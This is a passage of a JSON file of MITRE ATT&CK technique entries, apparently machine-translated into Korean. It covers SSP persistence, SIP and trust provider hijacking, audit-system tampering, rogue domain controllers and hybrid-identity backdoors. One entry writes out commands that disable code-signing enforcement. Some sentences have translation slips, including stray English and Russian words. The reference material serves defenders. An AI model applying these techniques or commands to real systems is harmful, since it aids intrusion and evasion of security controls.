    "description": "적대자는 보안 지원 공급자(SSP)를 악용하여 시스템 부팅 시 DLL을 실행할 수 있습니다. Windows SSP DLL은 시스템 시작 시 로컬 보안 기관(LSA) 프로세스에 로드됩니다. LSA에 로드되면 SSP DLL은 Windows에 저장된 암호화된 비밀번호와 평문 비밀번호에 접근할 수 있으며, 여기에는 로그인한 사용자의 도메인 비밀번호나 스마트 카드 PIN도 포함됩니다.\n\nSSP 구성은 두 개의 레지스트리 키에 저장됩니다: HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\Security Packages 및 HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\OSConfig\\Security Packages. 적대자는 이러한 레지스트리 키를 수정하여 새로운 SSP를 추가할 수 있으며, 이는 시스템을 다음 번 부팅할 때 또는 AddSecurityPackage Windows API 함수가 호출될 때 로드됩니다.",
    "external_id": "T1547.005",
    "modified": "2020-03-25T15:42:48.910Z",
    "translated": true
  },
  {
    "title": "Use Alternate Authentication Material",
    "description": "적대자들은 패스워드 해시, 커버로스 티켓, 애플리케이션 접근 토큰과 같은 대체 인증 자료를 사용하여 환경 내에서 측면 이동을 하고 정상적인 시스템 접근 제어를 우회할 수 있습니다.\n\n인증 프로세스는 일반적으로 유효한 신원(예: 사용자 이름)과 하나 이상의 인증 요인(예: 비밀번호, 핀, 물리적 스마트 카드, 토큰 생성기 등)을 요구합니다. 대체 인증 자료는 사용자가 유효한 신원과 요구되는 인증 요인을 제공하여 성공적으로 인증된 후 시스템에 의해 합법적으로 생성됩니다. 대체 인증 자료는 신원 생성 과정에서도 생성될 수 있습니다.\n\n대체 인증 자료를 캐싱하면 시스템이 사용자가 인증 요인을 다시 입력하도록 요청하지 않고도 신원이 성공적으로 인증되었음을 확인할 수 있습니다. 대체 인증은 시스템에 의해 유지되어야 하므로 메모리나 디스크에 저장되며, 자격 증명 접근 기술을 통해 도난당할 위험에 처할 수 있습니다. 대체 인증 자료를 도난당함으로써 적대자들은 시스템 접근 제어를 우회하고 평문 비밀번호나 다른 추가 인증 요인을 알지 못해도 시스템에 인증할 수 있습니다.",
    "external_id": "T1550",
    "modified": "2024-10-15T16:09:19.001Z",
    "translated": true
  },
  {
    "title": "Threat Intel Vendors",
    "description": "적대자들은 타겟팅에 사용할 수 있는 정보를 위해 위협 인텔리전스 공급자의 개인 데이터를 검색할 수 있습니다. 위협 인텔리전스 공급자는 공개적으로 보고된 것보다 더 많은 데이터를 제공하는 유료 피드나 포털을 제공할 수 있습니다. 민감한 세부사항(예: 고객 이름 및 기타 식별자)이 제거될 수 있지만, 이 정보는 타겟 산업, 귀속 주장, 성공적인 TTP/대응책과 같은 위반 사항에 대한 추세를 포함할 수 있습니다.\n\n적대자들은 실행 가능한 정보를 수집하기 위해 개인 위협 인텔리전스 공급자의 데이터를 검색할 수 있습니다. 위협 행위자들은 자신의 캠페인에 관한 정보/지표뿐만 아니라, 자신이 타겟으로 하는 산업, 능력/목표, 또는 기타 운영적 우려와 일치할 수 있는 다른 적대자들이 수행한 캠페인에 대한 정보를 찾을 수 있습니다. 공급자가 보고한 정보는 다른 형태의 정찰 기회를 드러낼 수도 있으며, 운영 리소스를 구축하거나 초기 접근을 설정하는 데 도움이 될 수 있습니다.",
    "external_id": "T1597.001",
    "modified": "2021-04-15T03:45:30.862Z",
    "translated": true
  },
  {
    "title": "Exfiltration Over Other Network Medium",
    "description": "적대자는 명령 및 제어 채널과 다른 네트워크 매체를 통해 데이터를 유출하려고 시도할 수 있습니다. 명령 및 제어 네트워크가 유선 인터넷 연결인 경우, 예를 들어 WiFi 연결, 모뎀, 셀룰러 데이터 연결, 블루투스 또는 다른 무선 주파수(RF) 채널을 통해 유출이 발생할 수 있습니다.\n\n적대자는 충분한 접근 권한이나 근접성이 있을 경우 이를 선택할 수 있으며, 연결이 동일한 기업 네트워크를 통해 라우팅되지 않기 때문에 주 인터넷 연결 채널만큼 잘 보호되거나 방어되지 않을 수 있습니다.",
    "external_id": "T1011",
    "modified": "2023-09-11T16:06:10.376Z",
    "translated": true
  },
  {
    "title": "Network Device Configuration Dump",
    "description": "적대자는 네트워크 구성 파일에 접근하여 장치 및 네트워크에 대한 민감한 데이터를 수집할 수 있습니다. 네트워크 구성은 장치의 작동을 결정하는 매개변수를 포함하는 파일입니다. 장치는 일반적으로 작동 중에 메모리 내 복사본을 저장하고, 장치 리셋 후 로드할 비휘발성 저장소에 별도의 구성을 저장합니다. 적대자는 구성 파일을 검사하여 대상 네트워크와 그 레이아웃, 네트워크 장치 및 소프트웨어, 또는 나중에 사용할 합법적인 계정 및 자격증명을 식별하는 정보를 드러낼 수 있습니다.\n\n적대자는 일반적인 관리 도구 및 프로토콜을 사용하여 네트워크 구성 파일에 접근할 수 있습니다. 이러한 도구는 구성 리포지토리에서 특정 데이터를 조회하거나 장치를 구성하여 나중에 분석을 위해 구성을 내보내도록 설정하는 데 사용될 수 있습니다.",
    "external_id": "T1602.002",
    "modified": "2022-02-17T19:50:46.948Z",
    "translated": true
  },
  {
    "title": "Gather Victim Identity Information",
    "description": "적대자는 타겟팅 중에 사용할 수 있는 피해자의 신원에 대한 정보를 수집할 수 있습니다. 신원에 대한 정보는 개인 데이터(예: 직원 이름, 이메일 주소, 보안 질문에 대한 답변 등)와 자격 증명 또는 다단계 인증(MFA) 구성과 같은 민감한 세부 정보를 포함할 수 있습니다.\n\n적대자는 다양한 방법으로 이 정보를 수집할 수 있으며, 정보에 대한 직접적인 유도나 인증 서비스로부터의 응답을 분석하여 시스템의 유효한 사용자 이름 또는 해당 사용자 이름과 관련된 허용된 MFA 방법을 노출할 수 있습니다. 피해자에 대한 정보는 온라인 또는 기타 접근 가능한 데이터 세트를 통해 적대자에게 노출될 수 있습니다.\n\n이 정보를 수집함으로써 다른 형태의 정찰 기회를 발견하고, 운영 자원을 구축하며, 초기 접근을 설정할 수 있습니다.",
    "external_id": "T1589",
    "modified": "2024-09-16T16:09:45.794Z",
    "translated": true
  },
  {
    "title": "Disable or Modify System Firewall",
    "description": "위협 행위자는 네트워크 사용을 제한하는 제어를 우회하기 위해 시스템 방화벽을 비활성화하거나 수정할 수 있습니다. 변경 사항은 전체 메커니즘을 비활성화하는 것뿐만 아니라 특정 규칙을 추가, 삭제 또는 수정하는 것도 포함될 수 있습니다. 이는 운영 체제에 따라 다양한 방법으로 수행될 수 있으며, 명령줄을 통해 또는 Windows 레지스트리 키를 편집하거나 Windows 제어판을 사용하여 이루어질 수 있습니다.\n\n시스템 방화벽을 수정하거나 비활성화하면 위협 행위자의 C2 통신, 수평 이동, 및/또는 데이터 유출이 가능해질 수 있으며, 이는 원래 허용되지 않는 행동입니다. 예를 들어, 위협 행위자는 비전통적이고 잠재적으로 보안성이 낮은 포트를 사용하는 잘 알려진 프로토콜(예: RDP)에 대한 새로운 방화벽 규칙을 추가할 수 있습니다.\n\n위협 행위자는 또한 시스템 방화벽을 간접적으로 조작하는 호스트 네트워킹 설정을 수정할 수 있습니다. 예를 들어, 인터페이스 대역폭이나 네트워크 연결 요청 임계값을 변경할 수 있습니다. 다양한 원격 서비스의 남용을 활성화하는 것과 관련된 설정도 방화벽 규칙을 간접적으로 수정할 수 있습니다.",
    "external_id": "T1562.004",
    "modified": "2024-09-12T19:37:57.867Z",
    "translated": true
  },
  {
    "title": "Archive Collected Data",
    "description": "적대자는 유출 이전에 수집한 데이터를 압축 및/또는 암호화할 수 있습니다. 데이터를 압축하면 수집된 데이터를 숨기고 네트워크를 통해 전송되는 데이터의 양을 최소화하는 데 도움이 될 수 있습니다. 암호화는 탐지를 피할 수 있도록 유출되는 정보를 숨기거나 방어자가 검사할 때 유출이 덜 눈에 띄게 만들 수 있습니다.\n\n압축과 암호화는 모두 유출 이전에 수행되며 유틸리티, 제3자 라이브러리 또는 맞춤 방법을 사용하여 수행할 수 있습니다.",
    "external_id": "T1560",
    "modified": "2024-01-20T00:07:58.958Z",
    "translated": true
  },
  {
    "title": "SIP and Trust Provider Hijacking",
    "description": "적대자는 SIP 및 신뢰 제공자 구성 요소를 조작하여 운영 체제와 애플리케이션 제어 도구를 오도할 수 있으며, 이는 서명 검증 검사 수행 시 발생할 수 있습니다. 사용자 모드에서 Windows Authenticode 디지털 서명은 파일의 출처와 무결성을 확인하는 데 사용되며, 이는 서명된 코드에 대한 신뢰를 설정하는 데 사용될 수 있는 변수입니다. 서명 검증 프로세스는 WinVerifyTrust 응용 프로그래밍 인터페이스(API) 기능을 통해 처리되며, 이 기능은 문의를 수락하고 서명의 매개변수를 검증하는 책임이 있는 적절한 신뢰 제공자와 조정합니다.\n\n서명 형식과 실행 파일 유형이 다양하기 때문에 Microsoft는 API 기능과 파일 간의 추상화 계층을 제공하기 위해 주체 인터페이스 패키지(SIPs)라는 소프트웨어 구성 요소를 만들었습니다. SIP는 API 기능이 서명을 생성, 검색, 계산 및 검증할 수 있도록 하는 역할을 합니다. 대부분의 파일 형식에 대해 고유한 SIP가 존재하며, 이들은 전 세계적으로 고유한 식별자인 GUID로 식별됩니다.\n\n적대자는 이 구조를 악용하여 신뢰 제어를 우회하고 시스템에서 합법적으로 서명된 코드만 실행하도록 허용하는 보안 정책을 우회할 수 있습니다. 적대자는 SIP와 신뢰 제공자 구성 요소를 탈취하여 운영 체제와 애플리케이션 제어 도구가 악성(또는 기타) 코드를 서명된 것으로 분류하도록 오도할 수 있습니다. \n\n* 악성으로 제작된 DLL을 가리키도록 <code>Dll</code> 및 <code>FuncName</code> 레지스트리 값을 수정하여, 이는 SIP의 CryptSIPDllGetSignedDataMsg 기능을 제공하는 동적 링크 라이브러리(DLL)를 가리키며, 서명된 파일에서 인코딩된 디지털 인증서를 검색합니다. 항상 알려진 좋은 서명 값을 반환하는 내보내기 함수가 있는 악의적인 DLL을 가리킴으로써, 적대자는 해당 SIP를 사용하는 모든 파일에 대해 수용 가능한 서명 값을 적용할 수 있습니다.\n* 악성으로 제작된 DLL을 가리키도록 <code>Dll</code> 및 <code>FuncName</code> 레지스트리 값을 수정하여, 이는 SIP의 CryptSIPDllVerifyIndirectData 기능을 제공하는 DLL을 가리키고, 서명된 해시 값과 파일의 계산된 해시를 검증합니다. 항상 TRUE를 반환하는 내보내기 함수가 있는 악의적인 DLL을 가리킴으로써, 적대자는 해당 SIP를 사용하여 모든 파일(합법적인 서명 포함)을 성공적으로 검증할 수 있습니다.\n* 신뢰 제공자의 FinalPolicy 기능을 제공하는 DLL을 가리키도록 <code>DLL</code> 및 <code>Function</code> 레지스트리 값을 수정하여, 이는 디코딩되고 구문 분석된 서명을 확인하고 신뢰 결정을 내리는 곳입니다. 이 값은 이미 존재하는 DLL의 적절한 내보내기 함수나 악의적으로 제작된 DLL로 리디렉션될 수 있습니다.\n* **참고:** 위의 탈취는 레지스트리를 수정하지 않고도 가능할 수 있습니다.\n\nSIP 또는 신뢰 제공자 구성 요소를 탈취하면 악의적인 구성 요소가 코드 서명 또는 서명 검증을 수행하는 모든 응용 프로그램에 의해 호출될 수 있으므로 지속적인 코드 실행이 가능해질 수 있습니다.",
    "external_id": "T1553.003",
    "modified": "2022-05-05T04:58:58.214Z",
    "translated": true
  },
  {
    "title": "Browser Session Hijacking",
    "description": "상대방은 보안 취약점과 브라우저 소프트웨어의 고유 기능을 이용하여 콘텐츠를 변경하고 사용자 행동을 수정하며 정보를 가로채는 다양한 브라우저 세션 하이재킹 기법의 일환으로 행동할 수 있습니다. \n\n특정 예시로는 상대방이 브라우저에 소프트웨어를 주입하여 사용자의 쿠키, HTTP 세션 및 SSL 클라이언트 인증서를 상속받고, 이를 통해 브라우저를 인증된 인트라넷으로 접근하는 수단으로 사용하는 경우가 있습니다. 브라우저 기반 행동을 실행하기 위해서는 <code>SeDebugPrivilege</code>와 같은 특정 프로세스 권한이나 높은 무결성/관리자 권한이 필요할 수 있습니다. \n\n또 다른 예시는 상대방의 브라우저에서 사용자의 브라우저로 트래픽을 피벗하는 것입니다. 이는 웹 트래픽을 리디렉션하는 프록시를 설정하여 이루어지며, 사용자의 트래픽에는 어떤 변경도 가하지 않습니다. 브라우저가 닫히는 즉시 프록시 연결이 끊어질 수 있습니다. 상대방은 프록시가 주입된 브라우저 프로세스의 보안 컨텍스트를 가정하게 됩니다. 브라우저는 일반적으로 열리는 각 탭마다 새로운 프로세스를 생성하며, 권한과 인증서는 accordingly에 따라 분리됩니다. 이러한 권한이 있을 경우 상대방은 브라우저를 통해 접근 가능한 인트라넷의 모든 자원, 예를 들어 공유 사이트나 웹메일에 접근할 수 있는 가능성이 있습니다. 브라우저 피벗은 이중 인증에서 제공하는 보안을 우회할 수도 있습니다.",
    "external_id": "T1185",
    "modified": "2022-02-25T18:58:15.229Z",
    "translated": true
  },
  {
    "title": "Remote Services",
    "description": "적대자는 telnet, SSH 및 VNC와 같은 원격 연결을 허용하는 서비스에 로그인하기 위해 유효한 계정을 사용할 수 있습니다. 적대자는 로그인한 사용자로서 행동을 수행할 수 있습니다.\n\n기업 환경에서는 서버와 워크스테이션이 도메인으로 조직될 수 있습니다. 도메인은 중앙 집중식 신원 관리를 제공하여 사용자가 전체 네트워크에서 하나의 자격 증명 세트를 사용하여 로그인할 수 있도록 합니다. 만약 적대자가 유효한 도메인 자격 증명 세트를 얻는다면, 그들은 SSH나 RDP와 같은 원격 액세스 프로토콜을 사용하여 여러 다양한 머신에 로그인할 수 있습니다. 그들은 또한 도메인에 신원을 연합하는 접근 가능한 SaaS 또는 IaaS 서비스에 로그인할 수 있습니다.\n\n합법적인 애플리케이션(예: 소프트웨어 배포 도구 및 기타 관리 프로그램)은 원격 호스트에 접근하기 위해 원격 서비스(RS)를 활용할 수 있습니다. 예를 들어, MacOS의 Apple Remote Desktop (ARD)는 원격 관리를 위해 사용되는 기본 소프트웨어입니다. ARD는 화면 및 제어 버퍼를 전송하기 위해 VNC를 포함한 여러 프로토콜을 활용하고, 안전한 파일 전송을 위해 SSH를 이용합니다. 적대자는 ARD와 같은 애플리케이션을 악용하여 원격 코드 실행을 얻고 측면 이동을 수행할 수 있습니다. macOS 10.14 이전 버전에서 적대자는 SSH 세션을 ARD 세션으로 상승시킬 수 있으며, 이를 통해 적대자는 사용자 상호작용 없이 TCC(투명성, 동의 및 제어) 프롬프트를 수락하고 데이터에 접근할 수 있습니다.",
    "external_id": "T1021",
    "modified": "2024-03-01T15:35:38.299Z",
    "translated": true
  },
  {
    "title": "Mail Protocols",
    "description": "적대자는 기존 트래픽에 섞여서 탐지를 피하거나 네트워크 필터링을 회피하기 위해 전자 메일 전달과 관련된 애플리케이션 계층 프로토콜을 사용하여 통신할 수 있습니다. 원격 시스템에 대한 명령과 종종 이러한 명령의 결과는 클라이언트와 서버 간의 프로토콜 트래픽에 내포됩니다.\n\n전자 메일을 전송하는 SMTP/S, POP3/S, IMAP과 같은 프로토콜은 환경에서 매우 흔할 수 있습니다. 이러한 프로토콜에서 생성된 패킷은 데이터를 숨길 수 있는 많은 필드와 헤더를 가질 수 있습니다. 데이터는 이메일 메시지 자체 내에서도 숨겨질 수 있습니다. 적대자는 이러한 프로토콜을 악용하여 피해자 네트워크 내에서 자신이 제어하는 시스템과 통신하면서 정상적이고 예상되는 트래픽을 모방할 수 있습니다.",
    "external_id": "T1071.003",
    "modified": "2024-04-16T12:28:59.928Z",
    "translated": true
  },
  {
    "title": "Hybrid Identity",
    "description": "적대자는 전통적인 인증 메커니즘을 우회하고 자격 증명에 접근하며 계정에 대한 지속적인 접근을 가능하게 하기 위해 온프레미스 사용자 ID와 연결된 클라우드 인증 프로세스를 패치, 수정 또는 백도어를 설정할 수 있습니다.\n\n많은 조직은 온프레미스와 클라우드 기반 환경 간에 공유되는 하이브리드 사용자 및 장치 ID를 유지합니다. 이러한 ID는 여러 가지 방법으로 관리될 수 있습니다. 예를 들어, Microsoft Entra ID는 Active Directory와 Entra ID 간의 ID 동기화를 위한 세 가지 옵션을 포함합니다:\n\n* 비밀번호 해시 동기화(PHS): 이 방법에서는 특권이 부여된 온프레미스 계정이 Active Directory와 Entra ID 간의 사용자 비밀번호 해시를 동기화하여 Entra ID 인증이 전적으로 클라우드에서 이루어질 수 있게 합니다.\n* 패스스루 인증(PTA): 이 방법에서는 Entra ID 인증 시도가 온프레미스 PTA 에이전트로 전달되어 자격 증명이 Active Directory에 대해 검증됩니다.\n* Active Directory 연합 서비스(AD FS): 이 방법에서는 Active Directory와 Entra ID 간의 신뢰 관계가 설정됩니다.\n\nAD FS는 AWS 및 GCP와 같은 다른 SaaS 및 클라우드 플랫폼과 함께 사용할 수 있으며, 이 경우 인증 프로세스가 AD FS로 전달되고 하이브리드 사용자 ID와 권한을 포함하는 토큰을 받아옵니다.\n\n하이브리드 ID와 연결된 인증 프로세스를 수정함으로써 적대자는 클라우드 리소스에 대한 지속적인 특권 접근을 설정할 수 있습니다. 예를 들어, PTA 에이전트를 실행하는 온프레미스 서버를 침해한 적대자는 `AzureADConnectAuthenticationAgentService` 프로세스에 악성 DLL을 주입하여 Entra ID에 대한 모든 인증 시도를 승인하고 사용자의 자격 증명을 기록할 수 있습니다. AD FS를 사용하는 환경에서는 적대자가 `Microsoft.IdentityServer.Servicehost` 구성 파일을 편집하여 모든 사용자에 대해 인증 토큰을 생성하는 악성 DLL을 로드하여 다단계 인증과 정의된 AD FS 정책을 우회할 수 있습니다.\n\n경우에 따라 적대자는 클라우드에서 하이브리드 ID 인증 프로세스를 수정할 수 있습니다. 예를 들어, Entra ID 테넌트에서 글로벌 관리자 계정을 침해한 적대자는 웹 콘솔을 통해 새 PTA 에이전트를 등록할 수 있으며, 이를 통해 자격 증명을 수집하고 어떤 사용자로든 Entra ID 환경에 로그인할 수도 있습니다.",
    "external_id": "T1556.007",
    "modified": "2024-10-14T22:11:30.271Z",
    "translated": true
  },
  {
    "title": "Vulnerability Scanning",
    "description": "적대 세력은 표적에서 취약점을 검색하여 타겟팅에 사용할 수 있습니다. 취약성 스캔은 일반적으로 특정 악용을 위해 적대 세력이 사용할 수 있는 소프트웨어 및 버전과 같은 타겟 호스트/응용 프로그램의 구성이 잠재적으로 일치하는지를 확인합니다.\n\n이러한 스캔은 더 일반적인 방법으로 피해자 호스트 정보를 수집하여 더 널리 알려진 악용 가능 취약점을 식별하는 데 사용될 수 있습니다. 취약성 스캔은 일반적으로 서버 배너, 수신 중인 포트 또는 기타 네트워크 아티팩트를 통해 실행 중인 소프트웨어 및 버전 번호를 수집합니다. 이러한 스캔에서 수집된 정보는 다른 형태의 정찰 기회를 드러낼 수 있으며, 운영 자원을 구축하거나 초기 접근을 수립하는 데 사용될 수 있습니다.",
    "external_id": "T1595.002",
    "modified": "2024-10-15T13:37:31.317Z",
    "translated": true
  },
  {
    "title": "Cloud API",
    "description": "적대자는 클라우드 API를 악용하여 악의적인 명령을 실행할 수 있습니다. 클라우드 환경에서 제공되는 API는 다양한 기능을 제공하며, 세입자의 거의 모든 측면에 대한 프로그램적 접근을 위한 기능이 풍부한 방법입니다. 이러한 API는 명령줄 인터프리터(CLI), 브라우저 내 클라우드 셸, PowerShell 모듈 또는 Python과 같은 언어를 위한 소프트웨어 개발 키트(SDK)를 통해 활용될 수 있습니다.  \n\n클라우드 API 기능은 컴퓨팅, 스토리지, 신원 및 접근 관리(IAM), 네트워킹 및 보안 정책과 같은 세입자의 모든 주요 서비스에 대한 관리 접근을 허용할 수 있습니다.\n\n적절한 권한이 있을 경우(보통 인증 정보인 애플리케이션 접근 토큰 및 웹 세션 쿠키를 사용하여), 적대자는 클라우드 API를 악용하여 악의적인 작업을 실행하는 다양한 기능을 호출할 수 있습니다. 예를 들어, CLI 및 PowerShell 기능은 클라우드 호스팅 또는 온프레미스 호스트에 설치된 바이너리를 통해 접근하거나 많은 클라우드 플랫폼에서 제공하는 브라우저 기반 클라우드 셸을 통해 접근할 수 있습니다. 이러한 클라우드 셸은 종종 클라우드 환경에서 컨테이너로 호스팅되는 CLI 및/또는 스크립팅 모듈을 사용할 수 있는 패키지화된 통합 환경입니다.",
    "external_id": "T1059.009",
    "modified": "2024-10-15T15:44:20.143Z",
    "translated": true
  },
  {
    "title": "Search Open Technical Databases",
    "description": "적대 세력은 표적화 과정에서 사용할 수 있는 피해자에 대한 정보를 찾기 위해 자유롭게 이용 가능한 기술 데이터베이스를 검색할 수 있습니다. 피해자에 대한 정보는 도메인/인증서 등록과 같은 온라인 데이터베이스 및 네트워크 데이터/트래픽 또는 스캔에서 수집된 아티팩트를 포함한 공개 수집물에서 확인할 수 있습니다.\n\n적대 세력은 원하는 정보를 수집하기 위해 다양한 공개 데이터베이스를 검색할 수 있습니다. 이러한 출처에서 얻은 정보는 다른 형태의 정찰 기회를 드러낼 수 있으며, 이를 통해 운영 자원을 구축하거나 초기 접근을 확보할 수 있습니다.",
    "external_id": "T1596",
    "modified": "2022-10-18T22:45:19.607Z",
    "translated": true
  },
  {
    "title": "Electron Applications",
    "description": "적대자는 전자 프레임워크의 구성 요소를 악용하여 악성 코드를 실행할 수 있습니다. Electron 프레임워크는 Signal, Slack 및 Microsoft Teams와 같은 많은 일반 응용 프로그램을 호스팅합니다. 원래 GitHub에 의해 개발된 Electron은 JavaScript, HTML 및 CSS와 같은 웹 기술을 사용하는 크로스 플랫폼 데스크톱 응용 프로그램 개발 프레임워크입니다. Chromium 엔진은 웹 콘텐츠를 표시하는 데 사용되며, Node.js는 백엔드 코드를 실행합니다.\n\nElectron의 기능적 특성(예: 앱이 임의의 명령을 실행하도록 허용) 덕분에 적대자는 프레임워크 내에서 합법적인 도구로 위장된 배경에서 악성 기능을 수행할 수 있습니다. 예를 들어, `teams.exe`와 `chrome.exe`의 악용은 적대자가 합법적인 응용 프로그램의 자식 프로세스로 악성 명령을 실행할 수 있도록 할 수 있습니다.\n\n적대자는 또한 Electron 응용 프로그램 내에 악성 JavaScript를 심어 악성 콘텐츠를 실행할 수 있습니다.",
    "external_id": "T1218.015",
    "modified": "2024-04-15T23:00:33.493Z",
    "translated": true
  },
  {
    "title": "Disable or Modify Linux Audit System",
    "description": "적대자는 리눅스 감사 시스템을 비활성화하거나 수정하여 악의적인 활동을 숨기고 탐지를 피할 수 있습니다. 리눅스 관리자들은 리눅스 감사 시스템을 사용하여 시스템의 보안 관련 정보를 추적합니다. 리눅스 감사 시스템은 커널 수준에서 작동하며, 사전 구성된 규칙에 따라 프로세스, 네트워크, 파일 및 로그인 이벤트와 같은 애플리케이션 및 시스템 활동에 대한 이벤트 로그를 유지합니다.\n\n종종 `auditd`라고 불리는 이는 이벤트를 디스크에 기록하는 데 사용되는 데몬의 이름이며, `audit.conf` 구성 파일에 설정된 매개변수에 따라 제어됩니다. 로그 생성 규칙을 구성하는 두 가지 주요 방법은 명령 줄의 `auditctl` 유틸리티와 부팅 시 로드되는 `auditctl` 명령의 시퀀스를 포함하는 파일 `/etc/audit/audit.rules`를 통해 이루어집니다.\n\n루트 권한을 가진 경우, 적대자는 감사 시스템 서비스를 비활성화하거나 설정/규칙 파일을 편집하거나 감사 시스템 라이브러리 함수에 후킹하여 자신의 활동이 기록되지 않도록 할 수 있습니다. 명령 줄을 사용하여, 적대자는 `auditd` 데몬과 관련된 프로세스를 종료하거나 `systemctl`을 사용하여 감사 서비스를 중지함으로써 감사 시스템 서비스를 비활성화할 수 있습니다. 또한 적대자는 감사 시스템 함수를 후킹하여 로그 기록을 비활성화하거나 `/etc/audit/audit.rules` 또는 `audit.conf` 파일에 포함된 규칙을 수정하여 악의적인 활동을 무시하도록 할 수 있습니다.",
    "external_id": "T1562.012",
    "modified": "2023-10-03T03:44:46.935Z",
    "translated": true
  },
  {
    "title": "Rogue Domain Controller",
    "description": "적대자는 악성 도메인 컨트롤러(Domain Controller)를 등록하여 Active Directory 데이터를 조작할 수 있습니다. DCShadow는 악성 도메인 컨트롤러를 생성하는 데 사용될 수 있습니다. DCShadow는 도메인 컨트롤러의 동작을 시뮬레이션하고 비활성 등록을 재사용하거나 등록하여 Active Directory(AD) 데이터, 객체 및 스키마를 조작하는 방법입니다. 등록이 완료되면 악성 DC는 자격 증명 및 키를 포함한 모든 도메인 객체에 대한 변경 사항을 AD 인프라에 주입하고 복제할 수 있습니다.\n\n악성 DC를 등록하려면 AD 스키마의 구성 파티션에 새로운 서버와 nTDSDSA 객체를 생성해야 하며, 이는 관리자 권한(도메인 또는 DC에 로컬)을 요구하거나 KRBTGT 해시가 필요합니다.\n\n이 기술은 시스템 로깅 및 보안 모니터를 우회할 수 있으며, 이는 악성 DC에서 수행된 작업이 이러한 센서에 보고되지 않을 수 있기 때문입니다. 이 기술은 또한 복제 및 기타 관련 메타데이터를 변경하거나 삭제하여 포렌식 분석을 방해하는 데 사용될 수 있습니다. 적대자는 이 기술을 사용하여 SID 역사 삽입 및/또는 AD 객체(계정, 접근 제어 목록, 스키마 등)를 조작하여 지속성을 위한 백도어를 설정할 수 있습니다.",
    "external_id": "T1207",
    "modified": "2022-03-08T21:20:04.850Z",
    "translated": true
  },
  {
    "title": "Code Signing Policy Modification",
    "description": "적대자는 서명되지 않거나 자체 서명된 코드를 실행할 수 있도록 코드 서명 정책을 수정할 수 있습니다. 코드 서명은 개발자로부터 프로그램의 진정성을 증명하고 프로그램이 변조되지 않았음을 보장합니다. 보안 제어는 운영 체제에서 유효하고 서명된 코드만 실행될 수 있도록 하는 강제 메커니즘을 포함할 수 있습니다.\n\n이러한 보안 제어 중 일부는 기본적으로 활성화되어 있을 수 있으며, 예를 들어 Windows의 드라이버 서명 강제(DSE) 또는 macOS의 시스템 무결성 보호(SIP)가 있습니다. 다른 제어는 기본적으로 비활성화될 수 있지만, 응용 프로그램 제어를 통해 구성할 수 있습니다. 예를 들어, 서명된 동적 링크 라이브러리(DLL)만 시스템에서 실행할 수 있도록 허용하는 것입니다. 개발자가 응용 프로그램 개발 및 테스트 중에 기본 서명 강제 정책을 수정하는 것이 유용할 수 있기 때문에, 이러한 기능을 비활성화하는 것은 상승된 권한으로 가능할 수 있습니다.\n\n적대자는 명령줄 또는 GUI 유틸리티를 사용하거나, 컴퓨터를 디버그/복구 모드로 재부팅하거나, 커널 메모리의 변수 값을 변경하는 등 여러 방법으로 코드 서명 정책을 수정할 수 있습니다. 시스템의 코드 서명 정책을 수정할 수 있는 명령의 예로는 Windows에서 `bcdedit.exe -set TESTSIGNING ON`과 macOS에서 `csrutil disable`가 있습니다. 구현 방식에 따라 서명 정책 수정이 성공적으로 이루어지면 침해된 시스템의 재부팅이 필요할 수 있습니다. 또한, 일부 구현은 사용자에게 가시적인 인디케이터를 생성할 수 있습니다(예: 시스템이 테스트 모드에 있다는 화면 모서리에 표시되는 워터마크). 적대자는 이러한 인디케이터를 제거하려고 시도할 수 있습니다.\n\n서명 검사와 관련된 변수를 수정하기 위해 커널 메모리에 액세스하려면, 예를 들어 드라이버 서명 강제를 비활성화하기 위해 `g_CiOptions`를 변경하는 경우, 적대자는 서명된 취약한 드라이버를 사용하여 특권 상승을 위한 악용을 수행할 수 있습니다.",
    "external_id": "T1553.006",
    "modified": "2022-05-05T05:00:03.480Z",
    "translated": true
  },
  {
    "title": "Deploy Container",
    "description": "적대자는 실행을 촉진하거나 방어를 회피하기 위해 환경에 컨테이너를 배포할 수 있습니다. 때때로 적대자는 특정 이미지나 배포와 관련된 프로세스를 실행하기 위해 새 컨테이너를 배포할 수 있으며, 이러한 프로세스에는 악성코드를 실행하거나 다운로드하는 것이 포함됩니다. 다른 경우에는 적대자가 네트워크 규칙이나 사용자 제한 등이 설정되지 않은 새로운 컨테이너를 배포하여 환경 내의 기존 방어를 우회할 수 있습니다. 쿠버네티스 환경에서 적대자는 특정 노드에 특권이 부여되거나 취약한 컨테이너를 배포하려고 시도할 수 있으며, 이를 통해 호스트로 탈출하고 노드에서 실행 중인 다른 컨테이너에 접근할 수 있습니다.\n\n컨테이너는 Docker의 `create` 및 `start` API를 사용하거나 쿠버네티스 대시보드 또는 Kubeflow와 같은 웹 애플리케이션을 통해 배포될 수 있습니다. 쿠버네티스 환경에서는 ReplicaSets 또는 DaemonSets와 같은 작업 부하를 통해 컨테이너가 여러 노드에 배포될 수 있습니다. 적대자는 악성 이미지를 검색하거나 구축하여 컨테이너를 배포하거나, 실행 시 악성 페이로드를 다운로드하고 실행하는 정상 이미지를 기반으로 컨테이너를 배포할 수 있습니다.",
    "external_id": "T1610",
    "modified": "2024-10-15T15:06:17.124Z",
    "translated": true
  },
  {
    "title": "Modify Registry",
    "description": "적대 세력은 Windows 레지스트리와 상호작용하여 레지스트리 키 내에 구성 정보를 숨기거나 청소 작업의 일환으로 정보를 제거하거나 지속성 및 실행을 돕기 위한 다른 기술의 일환으로 사용할 수 있습니다.\n\n레지스트리의 특정 영역에 대한 접근은 계정 권한에 따라 달라지며, 일부는 관리자 수준의 접근을 요구합니다. 내장된 Windows 명령줄 유틸리티는 로컬 또는 원격 레지스트리 수정을 위해 사용될 수 있습니다. 원격 접근 도구와 같은 다른 도구들도 사용될 수 있으며, 이는 Windows API를 통해 레지스트리와 상호작용하는 기능을 포함할 수 있습니다.\n\n레지스트리 수정에는 키를 숨기는 행위도 포함될 수 있으며, 이는 키 이름 앞에 null 문자를 추가하여 오류를 발생시키거나 [Reg](https://attack.mitre.org/software/S0075) 또는 Win32 API를 사용하는 다른 유틸리티에서 읽을 때 무시되게 할 수 있습니다. 적대 세력은 이러한 псевдо-숨겨진 키를 악용하여 지속성을 유지하기 위한 페이로드/명령을 숨길 수 있습니다.\n\n원격 시스템의 레지스트리는 파일 실행을 돕기 위해 수정될 수 있으며, 이는 측면 이동의 일환으로 이루어질 수 있습니다. 이는 대상 시스템에서 원격 레지스트리 서비스가 실행되고 있어야 합니다. 종종 유효한 계정이 필요하며, 원격 시스템의 SMB/Windows 관리 공유에 대한 접근도 